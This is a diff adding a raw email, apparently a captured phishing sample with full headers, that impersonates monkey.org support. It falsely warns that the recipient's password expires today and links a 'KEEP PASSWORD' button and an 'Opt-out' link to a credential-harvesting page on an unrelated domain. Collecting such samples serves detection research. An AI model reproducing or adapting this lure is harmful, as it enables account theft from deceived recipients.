@@ -1,0 +1,153 @@
+Return-Path: peter.leuenberger@swissdiscovery.com
+Delivered-To: jose@monkey.org
+X-FDA: 82701832206.03.A5E8BAA
+Received: from halibut.exacthosting.com (halibut.exacthosting.com
+ [209.59.190.132])	by imf23.b.hostedemail.com (Postfix) with ESMTP id
+ EADF8160005	for <jose@monkey.org>; Tue, 22 Oct 2024 16:52:38 +0000 (UTC)
+Authentication-Results: imf23.b.hostedemail.com;	dkim=pass
+ header.d=swissdiscovery.com header.s=default header.b=FyFawodq;	dmarc=none;
+	spf=pass (imf23.b.hostedemail.com: domain of
+ peter.leuenberger@swissdiscovery.com designates 209.59.190.132 as permitted
+ sender) smtp.mailfrom=peter.leuenberger@swissdiscovery.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1729615896;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=6ffwmPyXfUa49mo2p220MbsKaZrGyAwXsCe5MIOP+uw=;
+	b=c8WVtDwgte9r6N7LBCg/5TpmeojdDBPNFU1zlaD5iZ0wZSWmapkNdJvjxfEXrVqWkhVc9R
+	KOakZDMm3maSHGm/xm3ogR83hpCvL/VEWN0XQIfaNWZqMvPqg9xvJx+8cKwXT7kLCHJnI8
+	GZdYYKy6b8SwztWnm8Q+gFCXDwGL+CE=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1729615896; a=rsa-sha256;
+	cv=none;
+	b=Lhz4GWaLjIBPtX5pXKs2v3cgVc+ThUZqo6vYMlv0oPlFh8w33NJnZkB+qANolNEjP2dIZx
+	iw/qD3vVqe6QZuvPZ7Z+sYSt4YQC4Drlv4fakhBhyYesxJB2dc3LUcFK72xqhbcfYmxr0M
+	5s9YyugxWxLq0Pra+wzCB40u3MU277I=
+ARC-Authentication-Results: i=1;	imf23.b.hostedemail.com;	dkim=pass
+ header.d=swissdiscovery.com header.s=default header.b=FyFawodq;	dmarc=none;
+	spf=pass (imf23.b.hostedemail.com: domain of
+ peter.leuenberger@swissdiscovery.com designates 209.59.190.132 as permitted
+ sender) smtp.mailfrom=peter.leuenberger@swissdiscovery.com
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=swissdiscovery.com; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=6ffwmPyXfUa49mo2p220MbsKaZrGyAwXsCe5MIOP+uw=; b=FyFawodqyka9ZoYyDEsI6eQs2A
+	O0Sx1wIRkQ6x/KtlqWz8WR8uNtLjd1LQA8GaWgY0GIj/gybysKp9MsFvMGPbUySNV2alPzQTx+OAl
+	wMeJSHeJo9XkEYAgYTQUmuty5rogyyPruQ/3qpQxNfkV/TboirKNHolj/UUqMztiE5bQxmlEp86XO
+	VsoFUq66b6U+CfvXblErUmA9E9Okn3MEOvD/iX4MGWNBpuJUyolkGYcRLpRaIxrJLg0Erk/4Fw90A
+	8oT6QXljbm42CHEnupXyeVgugzf31B+FhS/LrDyEfZ5BSATR833q9zatzL6ERLiGiGKLXo2bf9yi2
+	EFZ7B6xA==;
+Received: from ec2-13-113-213-208.ap-northeast-1.compute.amazonaws.com
+ ([13.113.213.208]:56629)	by halibut.exacthosting.com with esmtpsa  (TLS1.3)
+ tls TLS_AES_256_GCM_SHA384	(Exim 4.97.1)	(envelope-from
+ <peter.leuenberger@swissdiscovery.com>)	id 1t3I7r-00000002v2o-1UXS	for
+ jose@monkey.org;	Tue, 22 Oct 2024 12:52:54 -0400
+From: "Support/monkey.org" <peter.leuenberger@swissdiscovery.com>
+To: jose@monkey.org
+Subject: Your current email password expires today 
+Date: 22 Oct 2024 16:52:51 +0000
+Message-ID: <20241022165250.6630FE51CB12A057@swissdiscovery.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - halibut.exacthosting.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - swissdiscovery.com
+X-Get-Message-Sender-Via: halibut.exacthosting.com: authenticated_id:
+ peter.leuenberger@swissdiscovery.com
+X-Authenticated-Sender:
+ halibut.exacthosting.com: peter.leuenberger@swissdiscovery.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam01
+X-Rspamd-Queue-Id: EADF8160005
+X-Rspam-User: 
+X-Stat-Signature: eu3wmh6wqzddp18ft6cbozjc57jt3s5s
+X-Spam-Status: No, score=3.90
+X-HE-Tag: 1729615958-258891
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18JceOShYoHb8VIl6JqQSWHon+IM0KlbB1g+ScoXYY/Xmk?=
+ =?utf-8?q?Vu7puhf/q4VfdoqsxnidgbS7uUlh2UdxC9YM8qGjyoOWb6RyXcGcM21uUy+ocQyYs?=
+ =?utf-8?q?/5U1DTh61hcBjjv+KJyT0pLnUa7+mcg45sHVeeuobs7+yikuftQvLsVXECOXVcOGp?=
+ =?utf-8?q?O99OOgApB35QNGS0PEdFtgF8GeUr691NTnSsddo8k+Jyu2IIEgvWqPr1mQ68AgqsE?=
+ =?utf-8?q?dgMdelj+7WpouJZnfCFODmXYBX6S5XDjr5Q2ro8PBRoqbVtD0R25/BYFRHPO6lGOL?=
+ =?utf-8?q?wBVPpUKIB/M1/E4WkHoY2uQs5yiLEdtozpbdNWIXIfaumhbQ9s/SYhvmgilq4yr9D?=
+ =?utf-8?q?9QdkshZn13NsmACaJNsedDJppIa/4/aoMl0vYKInIAKxpNpj8+oqvocG0non0iKzs?=
+ =?utf-8?q?euH9MbgHx1yglk8ulJK9Wwhyi+Y2kqiNC680VV4n0GxfqCQQDFYlD0JSbR8E79w7X?=
+ =?utf-8?q?+PMAc9LTe8S7CBDo+uoG6yA7Dvv5Pcnu6ZTIGAsDfpX4u4Ys46+X3atSfeZ10A8jr?=
+ =?utf-8?q?8GY5YIYMTECbHPqUu7/+dKfLDYpFiuIcN4pSdrbJUE6NFtx5N/DjQSjSiGENUGOBf?=
+ =?utf-8?q?Ti0QYlQ5WDaUNyfj0DZ26531Hh4rl0r+rkfTQwPcvsJqHSc/AVxKHK7mCY4PSwNTY?=
+ =?utf-8?q?ptW449Q+ZlaL5e6WFxUZVcOPmczOd6j0UYq4fB9v7MykG6DPKb5y4hXChhVXY48bi?=
+ =?utf-8?q?7suKpOKkB3sFgv9UQeaFfjO+9IntoiAtn1k/0TUClvCn2goJJxSCjLqlMpKAz/bI8?=
+ =?utf-8?q?IAcH5SjmzWubrXu23JNsP+K7RFXHLYqCKM7uLt2xwmWFR+gdWis1EYvAie+k1Pasl?=
+ =?utf-8?q?BZO0V7xNic05D0l/qG1WX+8h95tEXvSPzlVIxwA0mSchn7vcW/orbNjJWHb5kJE3y?=
+ =?utf-8?q?/ocrESZtBDX7Cf9aiJySXG_zTHzaDeppRJteYqmnHkgp2ZtNm8lhMmUp8yfFFzRI/?=
+ =?utf-8?q?CZ9hsB9WzyuUsG92qd22TSZj386GVl0ItLrndanEeq43fGZF2YV30u9/qUl3zHMFU?=
+ =?utf-8?q?a3ljEJcjKvBYIrs3snX5+qRrdJDuFuHonpyOc1YipV46LvWvltF04MKWhJQ18Pe++?=
+ =?utf-8?q?Nirz0nhVmJcMgtlm3ZhJSnuH1z5B8oB2f0NyxuevQnD1cHirNHj7mLh4nAhv3T/GN?=
+ =?utf-8?q?HilBLS62322D1yUzipEjJehgYG7Zz6I7onS5NvOxNaYbazdvzdlFOD3LhErmuAzso?=
+ =?utf-8?q?MCR3KoD9+TFZ97r7RgjT1G8hcRr9h1iZSZh+kroLdEhmXc8hZ1C8r+uvPm73j+evl?=
+ =?utf-8?q?BB1+SxV5/d4jNtYsa+mq5TKulyQM20CQ57GmWCaoNGHV0xtwav+HyMg3WRqtlyl/i?=
+ =?utf-8?q?Kj4DowcHpWgaG+QByhcZa6nCzSkN+DofTJ8vF/CIWppebuR7uw1c3wkGXX+vrWQUS?=
+ =?utf-8?q?b0cxdUm2Dt4Qg6nXsH9bMtj4/FpwS991iBnXYZ7890CqNFhqvIEGMHJNsvLUhYmOo?=
+ =?utf-8?q?lgz9PVjXH6ErAMxeGC1TLIkqDPDcT2+150yQMfo2gf/efXdYT19TNrMVTQua34MUJ?=
+ =?utf-8?q?TVN2C9SZ4cZFQHyVuMoyDPw/zlLbgLQQVn3tUHw1iJP6Nu7oJfXFuQtcBAjpOCsPb?=
+ =?utf-8?q?iNjefFHHE1e2h6tpMNekaBfL8pvZkZTnoiKxIx+dpIykyPjnFJJ76y54Xz0y0vcyx?=
+ =?utf-8?q?1DYWBE4LIX7R42vZDJs5iET8OlymXFVmd9NRq5HA3mPZn4kP0TBEUhkVq/jXemkqa?=
+ =?utf-8?q?XkaP37rkBNhNLIvXbtTccWqGqkYl31tG/pDzLm975JdU5O5A19VrAftgwm3YSrWeQ?=
+ =?utf-8?q?tSveontKVZIrsTHHOSqMpbkOj1lQxlzGqsQnWMDkAmq1E11f1j1uKMYqrQG3NnY1D?=
+ =?utf-8?q?nYANAyg7YNNsaDWegRmw0FPU=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 312
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<p style=3D"margin: 0px 0px 1em; padding: 10px; text-align: left; color: rg=
+b(255, 255, 255); text-transform: none; text-indent: 0px; letter-spacing: n=
+ormal; font-family: Arial, Helvetica, sans-serif; font-size: 13px; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; white-space: normal; box-s=
+izing: border-box; orphans: 2; widows: 2; background-color: rgb(51, 51, 51)=
+; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
+troke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;">&=
+nbsp;jose@monkey.org</p>
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; padding-right: 20px; padding-l=
+eft: 20px; font-family: Arial, Helvetica, sans-serif; font-size: 13px; font=
+-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; b=
+ox-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 25=
+5, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;"><=
+p style=3D"margin: 0px 0px 1em; padding: 0px; font-size: 25px; box-sizing: =
+border-box;"><b style=3D"font-weight: bolder; box-sizing: border-box;">Pass=
+word Recovery</b></p><p style=3D"margin: 0px 0px 1em; padding: 0px; box-siz=
+ing: border-box;">Your current email password for jose@monkey.org expires t=
+oday 10/22/2024 4:52:50 p.m.</p><p style=3D"margin: 0px 0px 1em; padding: 5=
+px; box-sizing: border-box;">
+<a style=3D"padding: 10px; color: rgb(255, 255, 255); text-decoration: none=
+; box-sizing: border-box; background-color: rgb(51, 51, 51);" href=3D"https=
+://primesmartsystems.com.au/definitions/napion.com/homisas/auth8/ssl-tls/63=
+578490698756375460948573657486956837673897039683766-875787893475672896836/i=
+ndex.php?email=3Djose@monkey.org" target=3D"_blank" rel=3D"noreferrer">KEEP=
+ PASSWORD</a><br><br><br></p><p style=3D"margin: 0px 0px 1em; padding: 0px;=
+ box-sizing: border-box;"><br style=3D"box-sizing: border-box;">
+&copy;Copyright&nbsp;monkey.org (Pty) Ltd | All rights Reserved, <a href=3D=
+"https://primesmartsystems.com.au/definitions/napion.com/homisas/auth8/ssl-=
+tls/63578490698756375460948573657486956837673897039683766-87578789347567289=
+6836/index.php?email=3Djose@monkey.org">Opt-out</a></p><p style=3D"margin: =
+0px 0px 1em; padding: 0px; box-sizing: border-box;">&nbsp;2024--10-19 | Rep=
+ort ID: #Sales</p></div></body></html>
+
